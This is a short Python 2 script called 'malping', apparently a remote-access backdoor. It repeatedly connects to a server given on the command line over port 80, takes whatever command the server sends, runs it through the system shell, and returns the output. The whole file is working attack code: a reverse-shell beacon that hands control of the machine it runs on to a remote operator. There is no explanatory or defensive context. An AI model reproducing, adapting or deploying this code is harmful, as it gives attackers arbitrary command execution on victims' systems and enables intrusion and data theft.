#!/usr/bin/env python

import sys
import time
import socket
import datetime
import subprocess

if len(sys.argv) != 3:
    print 'Usage: ./malping [mp_server ip] [delay time (s)]'
    sys.exit(1)
HOST = sys.argv[1]
DELAY = int(sys.argv[2])
SIZE = 1024
PORT = 80

def main():
    print '[+] Malping started with delay of {} seconds.'.format(DELAY)
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
        except socket.error:
            print '[!] ({}) Could not connect to server. Waiting...'.format(datetime.datetime.now())
            time.sleep(DELAY)
            continue
        cmd = s.recv(SIZE)

        print '[+] ({}) Executing "{}"'.format(datetime.datetime.now(), cmd)
        stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]
        s.send(stdout)

        time.sleep(DELAY)

if __name__ == '__main__':
    main()
